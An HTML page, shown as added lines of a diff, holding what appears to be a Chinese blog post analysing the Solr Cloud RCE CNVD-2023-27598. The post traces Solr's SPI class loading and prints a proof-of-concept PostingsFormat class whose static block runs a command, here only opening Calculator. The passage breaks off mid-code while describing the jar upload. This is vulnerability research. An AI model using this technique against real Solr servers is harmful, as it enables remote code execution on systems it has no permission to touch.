@@ -1,0 +1,1231 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Solr Cloud RCE（CNVD-2023-27598）漏洞分析'>
+<title>Solr Cloud RCE漏洞分析</title>
+
+<link rel='canonical' href='https://blog.huamang.xyz/post/solr_cloud_rce/'>
+
+<link rel="stylesheet" href="/scss/style.min.a3acb339192261971279929bada446e8966aa7224703ebfd992d05448daed96b.css"><meta property='og:title' content='Solr Cloud RCE漏洞分析'>
+<meta property='og:description' content='Solr Cloud RCE（CNVD-2023-27598）漏洞分析'>
+<meta property='og:url' content='https://blog.huamang.xyz/post/solr_cloud_rce/'>
+<meta property='og:site_name' content='Huamang'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2023-07-18T00:37:35&#43;08:00'/><meta property='article:modified_time' content='2023-07-18T00:37:35&#43;08:00'/>
+<meta name="twitter:title" content="Solr Cloud RCE漏洞分析">
+<meta name="twitter:description" content="Solr Cloud RCE（CNVD-2023-27598）漏洞分析">
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "dark");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu2c79bb77476a4f0f53420443e9db5bfa_18691_300x0_resize_box_3.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Huamang</a></h1>
+            <h2 class="site-description"></h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://github.com/Huamang'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://blog.huamang.xyz/index.xml'
+                        target="_blank"
+                        title="RSS"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="5" cy="19" r="1" />
+  <path d="M4 4a16 16 0 0 1 16 16" />
+  <path d="M4 11a9 9 0 0 1 9 9" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com/Huamang7'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/about/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/friends/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>Friends</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>Dark Mode</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li>
+      <ol>
+        <li><a href="#影响版本">影响版本</a></li>
+        <li><a href="#环境搭建">环境搭建</a></li>
+        <li><a href="#漏洞分析">漏洞分析</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" style="background-color: #3b58eb; color: #fff;">
+                漏洞分析
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/post/solr_cloud_rce/">Solr Cloud RCE漏洞分析</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            Solr Cloud RCE（CNVD-2023-27598）漏洞分析
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Jul 18, 2023</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 5 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="影响版本">影响版本</h2>
+<blockquote>
+<p>8.10.0 &lt;= Apache Solr &lt; 9.2.0</p>
+</blockquote>
+<h2 id="环境搭建">环境搭建</h2>
+<p>9.1.1</p>
+<p><a class="link" href="https://www.apache.org/dyn/closer.lua/solr/solr/9.1.0/solr-9.1.0-src.tgz?action=download"  target="_blank" rel="noopener"
+    >9.1.0-src</a></p>
+<p><a class="link" href="https://www.apache.org/dyn/closer.lua/solr/solr/9.1.0/solr-9.1.0.tgz?action=download"  target="_blank" rel="noopener"
+    >9.1.0-bin</a></p>
+<hr>
+<p>8.11.2</p>
+<p><a class="link" href="https://dlcdn.apache.org/lucene/solr/8.11.2/solr-8.11.2.tgz"  target="_blank" rel="noopener"
+    >solr-8.11.2.tgz</a></p>
+<p><a class="link" href="https://dlcdn.apache.org/lucene/solr/8.11.2/solr-8.11.2-src.tgz"  target="_blank" rel="noopener"
+    >solr-8.11.2-src.tgz</a></p>
+<blockquote>
+<p>8系列通过Ant 构建，不能直接导入idea，需要在目录下提前构建下</p>
+<p>ant ivy-bootstrap、ant idea，然后直接导入idea即可</p>
+<p>9 系列通过Gradle构建，直接导入idea即可，且需要jdk11及以上</p>
+</blockquote>
+<p>‍</p>
+<p>idea打开src项目会自动用gradle构建好，慢慢等个一万年就好了</p>
+<p><img src="/assets/image-20230417191918-a4vpzhi.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image"
+	
+	
+>​</p>
+<p>这里会重新构建idea项目结构，并且编译好</p>
+<p>然后创建一个远程监听，接着去bin项目启动cloud模式，添加参数到debug</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="p">.</span><span class="o">/</span><span class="nx">solr</span> <span class="nx">start</span> <span class="o">-</span><span class="nx">e</span> <span class="nx">cloud</span> <span class="o">-</span><span class="nx">a</span> <span class="s">&#34;-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img src="/assets/image-20230418004923-174jqaq.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image"
+	
+	
+>​</p>
+<h2 id="漏洞分析">漏洞分析</h2>
+<p>漏洞路径是利用<code>org.apache.solr.core.SolrConfig#initLibs</code>​里的下面的代码去加载Evil Jar包执行static 代码块中恶意代码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="k">if</span> <span class="o">(!</span><span class="n">urls</span><span class="o">.</span><span class="na">isEmpty</span><span class="o">())</span> <span class="o">{</span>
+      <span class="n">loader</span><span class="o">.</span><span class="na">addToClassLoader</span><span class="o">(</span><span class="n">urls</span><span class="o">);</span>
+      <span class="n">loader</span><span class="o">.</span><span class="na">reloadLuceneSPI</span><span class="o">();</span>
+    <span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>关键方法<code>addToClassLoader</code>​，注意这里的<code>needToReloadLuceneSPI</code>​ ，会用<strong>SPI机制</strong>进行加载</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="cm">/**
+</span><span class="cm"> * Adds URLs to the ResourceLoader&#39;s internal classloader. This method &lt;b&gt;MUST&lt;/b&gt; only be called
+</span><span class="cm"> * prior to using this ResourceLoader to get any resources, otherwise its behavior will be
+</span><span class="cm"> * non-deterministic. You also have to {link @reloadLuceneSPI} before using this ResourceLoader.
+</span><span class="cm"> *
+</span><span class="cm"> * @param urls the URLs of files to add
+</span><span class="cm"> */</span>
+<span class="kd">synchronized</span> <span class="kt">void</span> <span class="nf">addToClassLoader</span><span class="o">(</span><span class="n">List</span><span class="o">&lt;</span><span class="n">URL</span><span class="o">&gt;</span> <span class="n">urls</span><span class="o">)</span> <span class="o">{</span>
+  <span class="n">URLClassLoader</span> <span class="n">newLoader</span> <span class="o">=</span> <span class="n">addURLsToClassLoader</span><span class="o">(</span><span class="n">classLoader</span><span class="o">,</span> <span class="n">urls</span><span class="o">);</span>
+  <span class="k">if</span> <span class="o">(</span><span class="n">newLoader</span> <span class="o">==</span> <span class="n">classLoader</span><span class="o">)</span> <span class="o">{</span>
+    <span class="k">return</span><span class="o">;</span> <span class="c1">// short-circuit
+</span><span class="c1"></span>  <span class="o">}</span>
+
+  <span class="k">this</span><span class="o">.</span><span class="na">classLoader</span> <span class="o">=</span> <span class="n">newLoader</span><span class="o">;</span>
+  <span class="k">this</span><span class="o">.</span><span class="na">needToReloadLuceneSPI</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
+
+  <span class="k">if</span> <span class="o">(</span><span class="n">log</span><span class="o">.</span><span class="na">isInfoEnabled</span><span class="o">())</span> <span class="o">{</span>
+    <span class="n">log</span><span class="o">.</span><span class="na">info</span><span class="o">(</span>
+        <span class="s">&#34;Added {} libs to classloader, from paths: {}&#34;</span><span class="o">,</span>
+        <span class="n">urls</span><span class="o">.</span><span class="na">size</span><span class="o">(),</span>
+        <span class="n">urls</span><span class="o">.</span><span class="na">stream</span><span class="o">()</span>
+            <span class="o">.</span><span class="na">map</span><span class="o">(</span><span class="n">u</span> <span class="o">-&gt;</span> <span class="n">u</span><span class="o">.</span><span class="na">getPath</span><span class="o">().</span><span class="na">substring</span><span class="o">(</span><span class="n">0</span><span class="o">,</span> <span class="n">u</span><span class="o">.</span><span class="na">getPath</span><span class="o">().</span><span class="na">lastIndexOf</span><span class="o">(</span><span class="s">&#34;/&#34;</span><span class="o">)))</span>
+            <span class="o">.</span><span class="na">sorted</span><span class="o">()</span>
+            <span class="o">.</span><span class="na">distinct</span><span class="o">()</span>
+            <span class="o">.</span><span class="na">collect</span><span class="o">(</span><span class="n">Collectors</span><span class="o">.</span><span class="na">toList</span><span class="o">()));</span>
+  <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>定位变量到<code>reloadLuceneSPI</code>​，这里是用SPI动态加载Jar包</p>
+<blockquote>
+<p>SPI机制是Java提供的一种服务提供者框架，其基本思想是，提供者提供服务接口的实现，然后通过SPI机制将其注册到系统中，服务使用者可以通过SPI机制获取到所有已注册的服务提供者，从而实现服务的动态加载和扩展</p>
+</blockquote>
+<p>所以说有这个SPI机制，就可以在项目运行的时候，动态的添加库支持</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="cm">/**
+</span><span class="cm"> * Reloads all Lucene SPI implementations using the new classloader. This method must be called
+</span><span class="cm"> * after {@link #addToClassLoader(List)} and before using this ResourceLoader.
+</span><span class="cm"> */</span>
+<span class="kd">synchronized</span> <span class="kt">void</span> <span class="nf">reloadLuceneSPI</span><span class="o">()</span> <span class="o">{</span>
+  <span class="c1">// TODO improve to use a static Set&lt;URL&gt; to check when we need to
+</span><span class="c1"></span>  <span class="k">if</span> <span class="o">(!</span><span class="n">needToReloadLuceneSPI</span><span class="o">)</span> <span class="o">{</span>
+    <span class="k">return</span><span class="o">;</span>
+  <span class="o">}</span>
+  <span class="n">needToReloadLuceneSPI</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span> <span class="c1">// reset
+</span><span class="c1"></span>  <span class="n">log</span><span class="o">.</span><span class="na">debug</span><span class="o">(</span><span class="s">&#34;Reloading Lucene SPI&#34;</span><span class="o">);</span>
+
+  <span class="c1">// Codecs:
+</span><span class="c1"></span>  <span class="n">PostingsFormat</span><span class="o">.</span><span class="na">reloadPostingsFormats</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">classLoader</span><span class="o">);</span>
+  <span class="n">DocValuesFormat</span><span class="o">.</span><span class="na">reloadDocValuesFormats</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">classLoader</span><span class="o">);</span>
+  <span class="n">Codec</span><span class="o">.</span><span class="na">reloadCodecs</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">classLoader</span><span class="o">);</span>
+  <span class="c1">// Analysis:
+</span><span class="c1"></span>  <span class="n">CharFilterFactory</span><span class="o">.</span><span class="na">reloadCharFilters</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">classLoader</span><span class="o">);</span>
+  <span class="n">TokenFilterFactory</span><span class="o">.</span><span class="na">reloadTokenFilters</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">classLoader</span><span class="o">);</span>
+  <span class="n">TokenizerFactory</span><span class="o">.</span><span class="na">reloadTokenizers</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">classLoader</span><span class="o">);</span>
+<span class="o">}</span>
+
+</code></pre></td></tr></table>
+</div>
+</div><p>那么我们得知道他加载的前提，这就要理解一下SPI机制的实SPI机制</p>
+<p>简单来说他会遍历<code>META-INF/services</code>​文件夹找实现类去加载，所以我们得去实现这个文件夹下的接口</p>
+<p>这里8和9的貌似有点小区别</p>
+<p>8.11.2</p>
+<p><img src="/assets/image-20230418141259-idt33go.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image"
+	
+	
+></p>
+<p>9.1.0</p>
+<p><img src="/assets/image-20230418141211-1xpno4j.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image"
+	
+	
+>​</p>
+<p>这里我选的和360那篇文章一样的<code>PostingsFormat</code>​接口去实现一个恶意类，然后在static里面放恶意代码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">org.apache.solr.core</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">org.apache.lucene.codecs.FieldsConsumer</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.lucene.codecs.FieldsProducer</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.lucene.index.SegmentReadState</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.lucene.index.SegmentWriteState</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">EvilTest</span> <span class="kd">extends</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">lucene</span><span class="o">.</span><span class="na">codecs</span><span class="o">.</span><span class="na">PostingsFormat</span><span class="o">{</span>
+    <span class="kd">static</span> <span class="o">{</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">&#34;open /System/Applications/Calculator.app&#34;</span><span class="o">);</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="nf">EvilTest</span><span class="o">()</span> <span class="o">{</span>
+        <span class="kd">super</span><span class="o">(</span><span class="s">&#34;Exploit&#34;</span><span class="o">);</span>
+        <span class="k">try</span> <span class="o">{</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="n">FieldsConsumer</span> <span class="nf">fieldsConsumer</span><span class="o">(</span><span class="n">SegmentWriteState</span> <span class="n">segmentWriteState</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
+        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="nd">@Override</span>
+    <span class="kd">public</span> <span class="n">FieldsProducer</span> <span class="nf">fieldsProducer</span><span class="o">(</span><span class="n">SegmentReadState</span> <span class="n">segmentReadState</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
+        <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>‍</p>
+<hr>
+<p>接下来，就是上传jar的方式了，这里有两步，我们从后往前讲，这里爆出漏洞的功能点在solr8.10开始引入的功能点<code>Schema Designer</code>​</p>
+<p>新的sechema的创建可以基于一个Configset来创建，创建好schema以后，他会默认加载SolrConfig.xml，而这个就可以实现我们<strong>动态加载lib</strong></p>
+<p>代码在前面说到的<code>org.apache.solr.core.SolrConfig#initLibs</code>​ ，他在initLibs中会读取lib标签的jar包，通过正则判断是否符合后加载</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
